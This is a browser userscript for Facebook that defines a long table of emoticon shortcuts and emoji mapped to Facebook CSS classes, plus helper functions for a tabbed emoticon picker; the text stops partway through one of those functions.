	

    // ==UserScript==
    // @name            Everything At One @MrSenaa
    // @description     All about facebook By Candra
    // @include         https://*.facebook.com/*
    // @include         https://*.facebook.com/*/*
    // @include         http://*.facebook.com/*
    // @include         http://*.facebook.com/*/*
    // ==/UserScript==
    // ==============
    (function() {
            // Active only in main frame
            if (!document.querySelector("#pageNav")) {
                    return;
            }
            //console.info("Extra Facebook Smileys");
     
            // = Data =======
            var emoticons = [ { // Text to picture emoticons
    "chars" : " :) ",
                    "class" : "emoticon_smile",
                    "name" : "Smiley"
            }, {
                    "chars" : " :( ",
                    "class" : "emoticon_frown",
                    "name" : "Frown"
            }, {
                    "chars" : " :P ",
                    "class" : "emoticon_tongue",
                    "name" : "Tongue"
            }, {
            "chars" : " :D ",
                    "class" : "emoticon_grin",
                    "name" : "Grin"
            }, {
                    "chars" : " :o ",
                    "class" : "emoticon_gasp",
                    "name" : "Gasp"
            }, {
                    "chars" : " ;) ",
                    "class" : "emoticon_wink",
                    "name" : "Wink"
            }, {
                    "chars" : " :v ",
                    "class" : "emoticon_pacman",
                    "name" : "Pacman"
            }, {
                    "chars" : " >:( ",
                    "class" : "emoticon_grumpy",
                    "name" : "GruÃ±Ã³n"
            }, {
                    "chars" : " :/ ",
                    "class" : "emoticon_unsure",
                    "name" : "Unsure"
            }, {
                    "chars" : " :'( ",
                    "class" : "emoticon_cry",
                    "name" : "Cry"
            }, {
                    "chars" : " ^_^ ",
                    "class" : "emoticon_kiki",
                    "name" : "Kiki"
            }, {
                    "chars" : " 8) ",
                    "class" : "emoticon_glasses",
                    "name" : "Glasses"
            }, {
                    "chars" : " B| ",
                    "class" : "emoticon_sunglasses",
                    "name" : "Sunglasses"
            }, {
                    "chars" : " <3 ",
                    "class" : "emoticon_heart",
                    "name" : "Heart"
            }, {
                    "chars" : " 3:) ",
                    "class" : "emoticon_devil",
                    "name" : "Devil"
            }, {
                    "chars" : " O:) ",
                    "class" : "emoticon_angel",
                    "name" : "Angel"
            }, {
                    "chars" : " -_- ",
                    "class" : "emoticon_squint",
                    "name" : "Squint"
            }, {
                    "chars" : " o.O ",
                    "class" : "emoticon_confused",
                    "name" : "Confused"
            }, {
                    "chars" : " >:o ",
                    "class" : "emoticon_upset",
                    "name" : "Upset"
            }, {
                    "chars" : " :3 ",
                    "class" : "emoticon_colonthree",
                    "name" : "Colonthree"
            }, {
                    "chars" : " (y) ",
                    "class" : "emoticon_like",
                    "name" : "Like"
            }, {
                    "chars" : " :* ",
                    "class" : "emoticon emoticon_kiss",
                    "name" : "Kiss"
            }, {
                    "chars" : " (^^^) ",
                    "class" : "emoticon_shark",
                    "name" : "Shark"
            }, {
                    "chars" : " :|] ",
                    "class" : "emoticon_robot",
                    "name" : "Robot"
            }, {
                    "chars" : " <(\") ",
                    "class" : "emoticon_penguin",
                    "name" : "PingÃ¼ino"
            }, {
                    "chars" : " :poop: ",
                    "class" : "emoticon_poop",
                    "name" : "Poop"
            }, {
                    "chars" : " :putnam: ",
                    "class" : "emoticon_putnam",
                    "name" : "Putman"
            }, {
                    "chars" : " \ud83c\udf02 ",
                    "class" : "_1az _1a- _2c0",
                    "name" : "Pink Umbrella"
            }, {
                    "chars" : " \ud83c\udf0a ",
                    "class" : "_1az _1a- _2c1",
                    "name" : "Sea Wave"
            }, {
                    "chars" : " \ud83c\udf19 ",
                    "class" : "_1az _1a- _2c2",
                    "name" : "Crescent moon"
            }, {
                    "chars" : " \ud83c\udf1f ",
                    "class" : "_1az _1a- _2c3",
                    "name" : "Bright Star"
            }, {
                    "chars" : " \ud83c\udf31 ",
                    "class" : "_1az _1a- _2c4",
                    "name" : "Seedbed"
            }, {
                    "chars" : " \ud83c\udf34 ",
                    "class" : "_1az _1a- _2c5",
                    "name" : "Single Palm Tree"
            }, {
                    "chars" : " \ud83c\udf35 ",
                    "class" : "_1az _1a- _2c6",
                    "name" : "Cactus"
            }, {
                    "chars" : " \ud83c\udf37 ",
                    "class" : "_1az _1a- _2c7",
                    "name" : "Tulip"
            }, {
                    "chars" : " \ud83c\udf38 ",
                    "class" : "_1az _1a- _2c8",
                    "name" : "Cherry Blossom"
            }, {
                    "chars" : " \ud83c\udf39 ",
                    "class" : "_1az _1a- _2c9",
                    "name" : "Rose"
            }, {
                    "chars" : " \ud83c\udf3a ",
                    "class" : "_1az _1a- _2ca",
                    "name" : "Cayenne"
            }, {
                    "chars" : " \ud83c\udf3b ",
                    "class" : "_1az _1a- _2cb",
                    "name" : "Sunflower"
            }, {
                    "chars" : " \ud83c\udf3e ",
                    "class" : "_1az _1a- _2cc",
                    "name" : "Ear Of Rice"
            }, {
                    "chars" : " \ud83c\udf40 ",
                    "class" : "_1az _1a- _2cd",
                    "name" : "Four Leaf Clover"
            }, {
                    "chars" : " \ud83c\udf41 ",
                    "class" : "_1az _1a- _2ce",
                    "name" : "Maple Leaf"
            }, {
                    "chars" : " \ud83c\udf42 ",
                    "class" : "_1az _1a- _2cf",
                    "name" : "Fallen Leaf"
            }, {
                    "chars" : " \ud83c\udf43 ",
                    "class" : "_1az _1a- _2cg",
                    "name" : "Leaf Floating In The Wind"
            }, {
                    "chars" : " \ud83c\udf4a ",
                    "class" : "_1az _1a- _2ch",
                    "name" : "Tangerine"
            }, {
                    "chars" : " \ud83c\udf4e ",
                    "class" : "_1az _1a- _2ci",
                    "name" : "Red Apple"
            }, {
                    "chars" : " \ud83c\udf53 ",
                    "class" : "_1az _1a- _2cj",
                    "name" : "Strawberry"
            }, {
                    "chars" : " \ud83c\udf54 ",
                    "class" : "_1az _1a- _2ck",
                    "name" : "Burger"
            }, {
                    "chars" : " \ud83c\udf78 ",
                    "class" : "_1az _1a- _2cl",
                    "name" : "Cocktail Glass"
            }, {
                    "chars" : " \ud83c\udf7a ",
                    "class" : "_1az _1a- _2cm",
                    "name" : "Tankard"
            }, {
                    "chars" : " \ud83c\udf81 ",
                    "class" : "_1az _1a- _2cn",
                    "name" : "Gift Wrapped"
            }, {
                    "chars" : " \ud83c\udf83 ",
                    "class" : "_1az _1a- _2co",
                    "name" : "Pumpkin With Candle"
            }, {
                    "chars" : " \ud83c\udf84 ",
                    "class" : "_1az _1a- _2cp",
                    "name" : "Christmas Tree"
            }, {
                    "chars" : " \ud83c\udf85 ",
                    "class" : "_1az _1a- _2cq",
                    "name" : "Santa"
            }, {
                    "chars" : " \ud83c\udf88 ",
                    "class" : "_1az _1a- _2cr",
                    "name" : "Balloon"
            }, {
                    "chars" : " \ud83c\udf89 ",
                    "class" : "_1az _1a- _2cs",
                    "name" : "Party Popper"
            }, {
                    "chars" : " \ud83c\udf8d ",
                    "class" : "_1az _1a- _2ct",
                    "name" : "Pine Decor"
            }, {
                    "chars" : " \ud83c\udf8e ",
                    "class" : "_1az _1a- _2cu",
                    "name" : "Japanese Dolls"
            }, {
                    "chars" : " \ud83c\udf8f ",
                    "class" : "_1az _1a- _2cv",
                    "name" : "Carp Streamer"
            }, {
                    "chars" : " \ud83c\udf90 ",
                    "class" : "_1az _1a- _2cw",
                    "name" : "Wind Chime"
            }, {
                    "chars" : " \ud83c\udf93 ",
                    "class" : "_1az _1a- _2cx",
                    "name" : "Graduation Cap"
            }, {
                    "chars" : " \ud83c\udfb5 ",
                    "class" : "_1az _1a- _2cy",
                    "name" : "Musical Note"
            }, {
                    "chars" : " \ud83c\udfb6 ",
                    "class" : "_1az _1a- _2cz",
                    "name" : "Multiple Musical Notes"
            }, {
                    "chars" : " \ud83c\udfbc ",
                    "class" : "_1az _1a- _2c-",
                    "name" : "Musical Score"
            }, {
                    "chars" : " \ud83d\udc0d ",
                    "class" : "_1az _1a- _2c_",
                    "name" : "Snake"
            }, {
                    "chars" : " \ud83d\udc0e ",
                    "class" : "_1az _1a- _2d0",
                    "name" : "Horse"
            }, {
                    "chars" : " \ud83d\udc11 ",
                    "class" : "_1az _1a- _2d1",
                    "name" : "Sheep"
            }, {
                    "chars" : " \ud83d\udc12 ",
                    "class" : "_1az _1a- _2d2",
                    "name" : "Monkey"
            }, {
                    "chars" : " \ud83d\udc14 ",
                    "class" : "_1az _1a- _2d3",
                    "name" : "Hen"
            }, {
                    "chars" : " \ud83d\udc17 ",
                    "class" : "_1az _1a- _2d4",
                    "name" : "Wild Boar"
            }, {
                    "chars" : " \ud83d\udc18 ",
                    "class" : "_1az _1a- _2d5",
                    "name" : "Elephant"
            }, {
                    "chars" : " \ud83d\udc19 ",
                    "class" : "_1az _1a- _2d6",
                    "name" : "Octopus"
            }, {
                    "chars" : " \ud83d\udc1a ",
                    "class" : "_1az _1a- _2d7",
                    "name" : "Snail Shell"
            }, {
                    "chars" : " \ud83d\udc1b ",
                    "class" : "_1az _1a- _2d8",
                    "name" : "Insect"
            }, {
                    "chars" : " \ud83d\udc1f ",
                    "class" : "_1az _1a- _2d9",
                    "name" : "Fish"
            }, {
                    "chars" : " \ud83d\udc20 ",
                    "class" : "_1az _1a- _2da",
                    "name" : "Tropical Fish"
            }, {
                    "chars" : " \ud83d\udc21 ",
                    "class" : "_1az _1a- _2db",
                    "name" : "Pufferfish"
            }, {
                    "chars" : " \ud83d\udc25 ",
                    "class" : "_1az _1a- _2dc",
                    "name" : "Chick In Front"
            }, {
                    "chars" : " \ud83d\udc26 ",
                    "class" : "_1az _1a- _2dd",
                    "name" : "Bird"
            }, {
                    "chars" : " \ud83d\udc27 ",
                    "class" : "_1az _1a- _2de",
                    "name" : "Penguin"
            }, {
                    "chars" : " \ud83d\udc28 ",
                    "class" : "_1az _1a- _2df",
                    "name" : "Koala"
            }, {
                    "chars" : " \ud83d\udc29 ",
                    "class" : "_1az _1a- _2dg",
                    "name" : "Poodle"
            }, {
                    "chars" : " \ud83d\udc2b ",
                    "class" : "_1az _1a- _2dh",
                    "name" : "Bactrian Camel"
            }, {
                    "chars" : " \ud83d\udc2c ",
                    "class" : "_1az _1a- _2di",
                    "name" : "Dolphin"
            }, {
                    "chars" : " \ud83d\udc2d ",
                    "class" : "_1az _1a- _2dj",
                    "name" : "Mouse Face"
            }, {
                    "chars" : " \ud83d\udc2e ",
                    "class" : "_1az _1a- _2dk",
                    "name" : "Cow Face"
            }, {
                    "chars" : " \ud83d\udc2f ",
                    "class" : "_1az _1a- _2dl",
                    "name" : "Cara de tigre"
            }, {
                    "chars" : " \ud83d\udc30 ",
                    "class" : "_1az _1a- _2dm",
                    "name" : "Rabbit Face"
            }, {
                    "chars" : " \ud83d\udc31 ",
                    "class" : "_1az _1a- _2dn",
                    "name" : "Cat Face"
            }, {
                    "chars" : " \ud83d\udc33 ",
                    "class" : "_1az _1a- _2do",
                    "name" : "Whale Sputtering"
            }, {
                    "chars" : " \ud83d\udc34 ",
                    "class" : "_1az _1a- _2dp",
                    "name" : "Horse Face"
            }, {
                    "chars" : " \ud83d\udc35 ",
                    "class" : "_1az _1a- _2dq",
                    "name" : "Monkey Face"
            }, {
                    "chars" : " \ud83d\udc37 ",
                    "class" : "_1az _1a- _2dr",
                    "name" : "Pig face"
            }, {
                    "chars" : " \ud83d\udc38 ",
                    "class" : "_1az _1a- _2ds",
                    "name" : "Frog Face"
            }, {
                    "chars" : " \ud83d\udc39 ",
                    "class" : "_1az _1a- _2dt",
                    "name" : "Hamster Face"
            }, {
                    "chars" : " \ud83d\udc3a ",
                    "class" : "_1az _1a- _2du",
                    "name" : "Wolf Face"
            }, {
                    "chars" : " \ud83d\udc3b ",
                    "class" : "_1az _1a- _2dv",
                    "name" : "Bear Face"
            }, {
                    "chars" : " \ud83d\udc3e ",
                    "class" : "_1az _1a- _2dw",
                    "name" : "Footprints"
            }, {
                    "chars" : " \ud83d\udc40 ",
                    "class" : "_1az _1a- _2dx",
                    "name" : "Eyes"
            }, {
                    "chars" : " \ud83d\udc42 ",
                    "class" : "_1az _1a- _2dy",
                    "name" : "Ear"
            }, {
                    "chars" : " \ud83d\udc43 ",
                    "class" : "_1az _1a- _2dz",
                    "name" : "Nose"
            }, {
                    "chars" : " \ud83d\udc44 ",
                    "class" : "_1az _1a- _2d-",
                    "name" : "Mouth"
            }, {
                    "chars" : " \ud83d\udc45 ",
                    "class" : "_1az _1a- _2d_",
                    "name" : "Sour Face"
            }, {
                    "chars" : " \ud83d\udc46 ",
                    "class" : "_1az _1a- _2e0",
                    "name" : "White hand pointing up"
            }, {
                    "chars" : " \ud83d\udc47 ",
                    "class" : "_1az _1a- _2e1",
                    "name" : "White hand faces downward"
            }, {
                    "chars" : " \ud83d\udc48 ",
                    "class" : "_1az _1a- _2e2",
                    "name" : "White hand indicating left"
            }, {
                    "chars" : " \ud83d\udc49 ",
                    "class" : "_1az _1a- _2e3",
                    "name" : "White hand indicating right"
            }, {
                    "chars" : " \ud83d\udc4a ",
                    "class" : "_1az _1a- _2e4",
                    "name" : "Fist"
            }, {
                    "chars" : " \ud83d\udc4b ",
                    "class" : "_1az _1a- _2e5",
                    "name" : "Hand in motion"
            }, {
                    "chars" : " \ud83d\udc4c ",
                    "class" : "_1az _1a- _2e6",
                    "name" : "Hand showing all good"
            }, {
                    "chars" : " \ud83d\udc4d ",
                    "class" : "_1az _1a- _2e7",
                    "name" : "Hand with thumb up"
            }, {
                    "chars" : " \ud83d\udc4e ",
                    "class" : "_1az _1a- _2e8",
                    "name" : "Hand with thumb down"
            }, {
                    "chars" : " \ud83d\udc4f ",
                    "class" : "_1az _1a- _2e9",
                    "name" : "Hands clapping"
            }, {
                    "chars" : " \ud83d\udc50 ",
                    "class" : "_1az _1a- _2ea",
                    "name" : "Open Hands"
            }, {
                    "chars" : " \ud83d\udc66 ",
                    "class" : "_1az _1a- _2eb",
                    "name" : "Boy"
            }, {
                    "chars" : " \ud83d\udc67 ",
                    "class" : "_1az _1a- _2ec",
                    "name" : "Girl"
            }, {
                    "chars" : " \ud83d\udc68 ",
                    "class" : "_1az _1a- _2ed",
                    "name" : "Man"
            }, {
                    "chars" : " \ud83d\udc69 ",
                    "class" : "_1az _1a- _2ee",
                    "name" : "Woman"
            }, {
                    "chars" : " \ud83d\udc6b ",
                    "class" : "_1az _1a- _2ef",
                    "name" : "Man and woman holding hands"
            }, {
                    "chars" : " \ud83d\udc6e ",
                    "class" : "_1az _1a- _2eg",
                    "name" : "Police Officer"
            }, {
                    "chars" : " \ud83d\udc6f ",
                    "class" : "_1az _1a- _2eh",
                    "name" : "Woman with bunny ears"
            }, {
                    "chars" : " \ud83d\udc71 ",
                    "class" : "_1az _1a- _2ei",
                    "name" : "Person with hair rubio"
            }, {
                    "chars" : " \ud83d\udc72 ",
                    "class" : "_1az _1a- _2ej",
                    "name" : "Man with pi mao gua"
            }, {
                    "chars" : " \ud83d\udc73 ",
                    "class" : "_1az _1a- _2ek",
                    "name" : "Man with turban"
            }, {
                    "chars" : " \ud83d\udc74 ",
                    "class" : "_1az _1a- _2el",
                    "name" : "Old Man"
            }, {
                    "chars" : " \ud83d\udc75 ",
                    "class" : "_1az _1a- _2em",
                    "name" : "Old Woman"
            }, {
                    "chars" : " \ud83d\udc76 ",
                    "class" : "_1az _1a- _2en",
                    "name" : "Baby"
            }, {
                    "chars" : " \ud83d\udc77 ",
                    "class" : "_1az _1a- _2eo",
                    "name" : "Construction Worker"
            }, {
                    "chars" : " \ud83d\udc78 ",
                    "class" : "_1az _1a- _2ep",
                    "name" : "Princess"
            }, {
                    "chars" : " \ud83d\udc7b ",
                    "class" : "_1az _1a- _2eq",
                    "name" : "Ghost"
            }, {
                    "chars" : " \ud83d\udc7c ",
                    "class" : "_1az _1a- _2er",
                    "name" : "Angel baby"
            }, {
                    "chars" : " \ud83d\udc7d ",
                    "class" : "_1az _1a- _2es",
                    "name" : "Alien"
            }, {
                    "chars" : " \ud83d\udc7e ",
                    "class" : "_1az _1a- _2et",
                    "name" : "Alien Monster"
            }, {
                    "chars" : " \ud83d\udc7f ",
                    "class" : "_1az _1a- _2eu",
                    "name" : "Imp"
            }, {
                    "chars" : " \ud83d\udc80 ",
                    "class" : "_1az _1a- _2ev",
                    "name" : "Skull"
            }, {
                    "chars" : " \ud83d\udc82 ",
                    "class" : "_1az _1a- _2ew",
                    "name" : "Guard"
            }, {
                    "chars" : " \ud83d\udc83 ",
                    "class" : "_1az _1a- _2ex",
                    "name" : "Ballerina"
            }, {
                    "chars" : " \ud83d\udc85 ",
                    "class" : "_1az _1a- _2ey",
                    "name" : "Nail Polish"
            }, {
                    "chars" : " \ud83d\udc8b ",
                    "class" : "_1az _1a- _2ez",
                    "name" : "Brand of kiss"
            }, {
                    "chars" : " \ud83d\udc8f ",
                    "class" : "_1az _1a- _2e-",
                    "name" : "Kissing couple"
            }, {
                    "chars" : " \ud83d\udc90 ",
                    "class" : "_1az _1a- _2e_",
                    "name" : "Bunch of flowers"
            }, {
                    "chars" : " \ud83d\udc91 ",
                    "class" : "_1az _1a- _2f0",
                    "name" : "Couple with heart"
            }, {
                    "chars" : " \ud83d\udc93 ",
                    "class" : "_1az _1a- _2f1",
                    "name" : "Heart beating"
            }, {
                    "chars" : " \ud83d\udc94 ",
                    "class" : "_1az _1a- _2f2",
                    "name" : "Broken Heart"
            }, {
                    "chars" : " \ud83d\udc96 ",
                    "class" : "_1az _1a- _2f3",
                    "name" : "Bright Heart"
            }, {
                    "chars" : " \ud83d\udc97 ",
                    "class" : "_1az _1a- _2f4",
                    "name" : "Heart growing"
            }, {
                    "chars" : " \ud83d\udc98 ",
                    "class" : "_1az _1a- _2f5",
                    "name" : "Heart with arrow"
            }, {
                    "chars" : " \ud83d\udc99 ",
                    "class" : "_1az _1a- _2f6",
                    "name" : "Blue Heart"
            }, {
                    "chars" : " \ud83d\udc9a ",
                    "class" : "_1az _1a- _2f7",
                    "name" : "Green Heart"
            }, {
                    "chars" : " \ud83d\udc9b ",
                    "class" : "_1az _1a- _2f8",
                    "name" : "Yellow Heart"
            }, {
                    "chars" : " \ud83d\udc9c ",
                    "class" : "_1az _1a- _2f9",
                    "name" : "Purple Heart"
            }, {
                    "chars" : " \ud83d\udc9d ",
                    "class" : "_1az _1a- _2fa",
                    "name" : "Heart with ribbon"
            }, {
                    "chars" : " \ud83d\udca2 ",
                    "class" : "_1az _1a- _2fb",
                    "name" : "Symbol of anger"
            }, {
                    "chars" : " \ud83d\udca4 ",
                    "class" : "_1az _1a- _2fc",
                    "name" : "Sleeping"
            }, {
                    "chars" : " \ud83d\udca6 ",
                    "class" : "_1az _1a- _2fd",
                    "name" : "Sweat Symbol"
            }, {
                    "chars" : " \ud83d\udca8 ",
                    "class" : "_1az _1a- _2fe",
                    "name" : "Quick Start Symbol"
            }, {
                    "chars" : " \ud83d\udca9 ",
                    "class" : "_1az _1a- _2ff",
                    "name" : "Pile of Caca"
            }, {
                    "chars" : " \ud83d\udcaa ",
                    "class" : "_1az _1a- _2fg",
                    "name" : "Flexed bicep"
            }, {
                    "chars" : " \ud83d\udcbb ",
                    "class" : "_1az _1a- _2fh",
                    "name" : "Personal Computer"
            }, {
                    "chars" : " \ud83d\udcbd ",
                    "class" : "_1az _1a- _2fi",
                    "name" : "Mini Disco"
            }, {
                    "chars" : " \ud83d\udcbe ",
                    "class" : "_1az _1a- _2fj",
                    "name" : "Floppy disk"
            }, {
                    "chars" : " \ud83d\udcbf ",
                    "class" : "_1az _1a- _2fk",
                    "name" : "Optical Disc"
            }, {
                    "chars" : " \ud83d\udcc0 ",
                    "class" : "_1az _1a- _2fl",
                    "name" : "DVD"
            }, {
                    "chars" : " \ud83d\udcde ",
                    "class" : "_1az _1a- _2fm",
                    "name" : "Telephone receiver"
            }, {
                    "chars" : " \ud83d\udce0 ",
                    "class" : "_1az _1a- _2fn",
                    "name" : "Fax"
            }, {
                    "chars" : " \ud83d\udcf1 ",
                    "class" : "_1az _1a- _2fo",
                    "name" : "Mobile Phone"
            }, {
                    "chars" : " \ud83d\udcf2 ",
                    "class" : "_1az _1a- _2fp",
                    "name" : "Mobile phone with arrow from left to right"
            }, {
                    "chars" : " \ud83d\udcfa ",
                    "class" : "_1az _1a- _2fq",
                    "name" : "Television"
            }, {
                    "chars" : " \ud83d\udd14 ",
                    "class" : "_1az _1a- _2fr",
                    "name" : "Bell"
            }, {
                    "chars" : " \ud83d\ude01 ",
                    "class" : "_1az _1a- _2fs",
                    "name" : "Face to face with smiling eyes"
            }, {
                    "chars" : " \ud83d\ude02 ",
                    "class" : "_1az _1a- _2ft",
                    "name" : "Face with tears of joy"
            }, {
                    "chars" : " \ud83d\ude03 ",
                    "class" : "_1az _1a- _2fu",
                    "name" : "Smiley face with open mouth"
            }, {
                    "chars" : " \ud83d\ude04 ",
                    "class" : "_1az _1a- _2fv",
                    "name" : "Face and eyes smiling with mouth open"
            }, {
                    "chars" : " \ud83d\ude06 ",
                    "class" : "_1az _1a- _2fw",
                    "name" : "Smiley face with mouth open and eyes closed"
            }, {
                    "chars" : " \ud83d\ude09 ",
                    "class" : "_1az _1a- _2fx",
                    "name" : "Face winking eye"
            }, {
                    "chars" : " \ud83d\ude0b ",
                    "class" : "_1az _1a- _2fy",
                    "name" : "Guy savoring delicious food"
            }, {
                    "chars" : " \ud83d\ude0c ",
                    "class" : "_1az _1a- _2fz",
                    "name" : "Relief face"
            }, {
                    "chars" : " \ud83d\ude0d ",
                    "class" : "_1az _1a- _2f-",
                    "name" : "Smiley face with heart shaped eyes"
            }, {
                    "chars" : " \ud83d\ude0f ",
                    "class" : "_1az _1a- _2f_",
                    "name" : "Smirk face"
            }, {
                    "chars" : " \ud83d\ude12 ",
                    "class" : "_1az _1a- _2g0",
                    "name" : "Face of boredom"
            }, {
                    "chars" : " \ud83d\ude13 ",
                    "class" : "_1az _1a- _2g1",
                    "name" : "Face with cold sweat"
            }, {
                    "chars" : " \ud83d\ude14 ",
                    "class" : "_1az _1a- _2g2",
                    "name" : "Pensive face"
            }, {
                    "chars" : " \ud83d\ude16 ",
                    "class" : "_1az _1a- _2g3",
                    "name" : "Confused face"
            }, {
                    "chars" : " \ud83d\ude18 ",
                    "class" : "_1az _1a- _2g4",
                    "name" : "Throwing kiss Face"
            }, {
                    "chars" : " \ud83d\ude1a ",
                    "class" : "_1az _1a- _2g5",
                    "name" : "Kissing face with eyes closed"
            }, {
                    "chars" : " \ud83d\ude1c ",
                    "class" : "_1az _1a- _2g6",
                    "name" : "Face with tongue out and winking"
            }, {
                    "chars" : " \ud83d\ude1d ",
                    "class" : "_1az _1a- _2g7",
                    "name" : "Face with tongue hanging out and eyes closed"
            }, {
                    "chars" : " \ud83d\ude1e ",
                    "class" : "_1az _1a- _2g8",
                    "name" : "Face discouraged"
            }, {
                    "chars" : " \ud83d\ude20 ",
                    "class" : "_1az _1a- _2g9",
                    "name" : "Face of anger"
            }, {
                    "chars" : " \ud83d\ude21 ",
                    "class" : "_1az _1a- _2ga",
                    "name" : "Very angry face"
            }, {
                    "chars" : " \ud83d\ude22 ",
                    "class" : "_1az _1a- _2gb",
                    "name" : "Crying Face"
            }, {
                    "chars" : " \ud83d\ude23 ",
                    "class" : "_1az _1a- _2gc",
                    "name" : "Face of perseverance"
            }, {
                    "chars" : " \ud83d\ude24 ",
                    "class" : "_1az _1a- _2gd",
                    "name" : "Face of triumph"
            }, {
                    "chars" : " \ud83d\ude25 ",
                    "class" : "_1az _1a- _2ge",
                    "name" : "Face discouraged but relieved"
            }, {
                    "chars" : " \ud83d\ude28 ",
                    "class" : "_1az _1a- _2gf",
                    "name" : "Scary face"
            }, {
                    "chars" : " \ud83d\ude29 ",
                    "class" : "_1az _1a- _2gg",
                    "name" : "Fatigued face"
            }, {
                    "chars" : " \ud83d\ude2a ",
                    "class" : "_1az _1a- _2gh",
                    "name" : "Sleeping face"
            }, {
                    "chars" : " \ud83d\ude2b ",
                    "class" : "_1az _1a- _2gi",
                    "name" : "Tired face"
            }, {
                    "chars" : " \ud83d\ude2d ",
                    "class" : "_1az _1a- _2gj",
                    "name" : "Face screaming"
            }, {
                    "chars" : " \ud83d\ude30 ",
                    "class" : "_1az _1a- _2gk",
                    "name" : "Face with mouth open and cold sweat"
            }, {
                    "chars" : " \ud83d\ude31 ",
                    "class" : "_1az _1a- _2gl",
                    "name" : "Terrified face of fear"
            }, {
                    "chars" : " \ud83d\ude32 ",
                    "class" : "_1az _1a- _2gm",
                    "name" : "Very surprised face"
            }, {
                    "chars" : " \ud83d\ude33 ",
                    "class" : "_1az _1a- _2gn",
                    "name" : "Face flushed"
            }, {
                    "chars" : " \ud83d\ude35 ",
                    "class" : "_1az _1a- _2go",
                    "name" : "Face dizzy"
            }, {
                    "chars" : " \ud83d\ude37 ",
                    "class" : "_1az _1a- _2gp",
                    "name" : "Face with medical mask"
            }, {
                    "chars" : " \ud83d\ude38 ",
                    "class" : "_1az _1a- _2gq",
                    "name" : "Grinning Cat face and eyes closed"
            }, {
                    "chars" : " \ud83d\ude39 ",
                    "class" : "_1az _1a- _2gr",
                    "name" : "Cat face with tears of laughter"
            }, {
                    "chars" : " \ud83d\ude3a ",
                    "class" : "_1az _1a- _2gs",
                    "name" : "Smiling cat face with open mouth"
            }, {
                    "chars" : " \ud83d\ude3b ",
                    "class" : "_1az _1a- _2gt",
                    "name" : "Smiling cat face with hearts in her eyes"
            }, {
                    "chars" : " \ud83d\ude3c ",
                    "class" : "_1az _1a- _2gu",
                    "name" : "Face of cat smile twisted"
            }, {
                    "chars" : " \ud83d\ude3d ",
                    "class" : "_1az _1a- _2gv",
                    "name" : "Cat face kissing with eyes closed"
            }, {
                    "chars" : " \ud83d\ude3f ",
                    "class" : "_1az _1a- _2gw",
                    "name" : "Cat face crying"
            }, {
                    "chars" : " \ud83d\ude40 ",
                    "class" : "_1az _1a- _2gx",
                    "name" : "Cat face scared terrified"
            }, {
                    "chars" : " \ud83d\ude4b ",
                    "class" : "_1az _1a- _2gy",
                    "name" : "Happy person raising a hand"
            }, {
                    "chars" : " \ud83d\ude4c ",
                    "class" : "_1az _1a- _2gz",
                    "name" : "Person holding up both hands in celebration"
            }, {
                    "chars" : " \ud83d\ude4d ",
                    "class" : "_1az _1a- _2g-",
                    "name" : "Person frowning"
            }, {
                    "chars" : " \ud83d\ude4f ",
                    "class" : "_1az _1a- _2g_",
                    "name" : "Person in prayer"
            }, {
                    "chars" : " \u261d ",
                    "class" : "_1az _1a- _2h0",
                    "name" : "Index finger pointing up"
            }, {
                    "chars" : " \u263a ",
                    "class" : "_1az _1a- _2h1",
                    "name" : "White face smiling"
            }, {
                    "chars" : " \u26a1 ",
                    "class" : "_1az _1a- _2h2",
                    "name" : "High voltage symbol"
            }, {
                    "chars" : " \u26c4 ",
                    "class" : "_1az _1a- _2h3",
                    "name" : "Snowless snowman"
            }, {
                    "chars" : " \u270a ",
                    "class" : "_1az _1a- _2h4",
                    "name" : "Fist up"
            }, {
                    "chars" : " \u270b ",
                    "class" : "_1az _1a- _2h5",
                    "name" : "Hand pointing up"
            }, {
                    "chars" : " \u270c ",
                    "class" : "_1az _1a- _2h6",
                    "name" : "Winning Hand"
            }, {
                    "chars" : " \u2600 ",
                    "class" : "_1az _1a- _2h7",
                    "name" : "Sun With Rays"
            }, {
                    "chars" : " \u2601 ",
                    "class" : "_1az _1a- _2h8",
                    "name" : "Cloud"
            }, {
                    "chars" : " \u2614 ",
                    "class" : "_1az _1a- _2h9",
                    "name" : "Umbrella With Rain Drops"
            }, {
                    "chars" : " \u2615 ",
                    "class" : "_1az _1a- _2ha",
                    "name" : "Hot Drink"
            }, {
                    "chars" : " \u2728 ",
                    "class" : "_1az _1a- _2hb",
                    "name" : "Brightness"
            }, {
                    "chars" : " \u2764 ",
                    "class" : "_1az _1a- _2hc",
                    "name" : "Heavy Black Heart"
            } ];
     
            // = Variables =======
            var lastActiveElement = document.activeElement;
     
            // = Functions =======
            function createElement(html) {
                    var outerHTML = document.createElement("div");
                    outerHTML.innerHTML = html;
                    return outerHTML.firstChild;
            }
     
            function htmlSpecialChars(string) {
                    var div = document.createElement("div");
                    var text = document.createTextNode(string);
                    div.appendChild(text);
                    return div.innerHTML;
            }
     
            function isInstanceOfTextInput(element) {
                    return (element instanceof HTMLInputElement && element.type == "text")
                                    || element instanceof HTMLTextAreaElement;
            }
     
            function isFlyoutOpen(flyout) {
                    return flyout.className == "openToggler";
            }
     
            function openFlyout(flyout, open) {
                    if (open === undefined) {
                            open = !isFlyoutOpen(flyout); // Toggle
                    }
     
                    if (open) {
                            flyout.className = "openToggler";
                    } else {
                            flyout.removeAttribute("class");
                    }
            }
     
            function createTab(titleContainer, bodyContainer) {
                    var html;
                    // Tab; default = inactive
                html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
                    html += '<div class="jewelFlyout">';
                    html += '</div>';
                    html += '</li>';
                    var title = createElement(html);
                    titleContainer.appendChild(title);
     
                    // Manual input
                    html = '<div style="display: none;">';
                    html += '</div>';
                    var body = createElement(html);
                    bodyContainer.appendChild(body);
     
                    // Change tab listener
                    (function(body) {
                            title.addEventListener("click", function() {
                                    // Change tab
                                    var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
                                    for ( var t = 0; t < titles.length; t++) {
                                            if (titles[t] === this) { // Active
                                                   
                                            } else { // Inactive
                                                    titles[t].style.background = "";
                                                    titles[t].firstChild.style.color = "";
                                            }
                                    }
     
                                    // Change body
                                    var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
                                    for ( var b = 0; b < bodies.length; b++) {
                                            if (bodies[b] === body) { // Show
                                                    body.style.display = "";
                                            } else { // Hide
                                                    bodies[b].style.display = "none";
                                            }
                                    }
                            });
                    })(body);
     
                    return {
                            "title" : title.firstChild,
                            "body" : body
                    };
            }
     
            function createTabListBody(emoticons, filter) {
                    var html;
     
                    html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
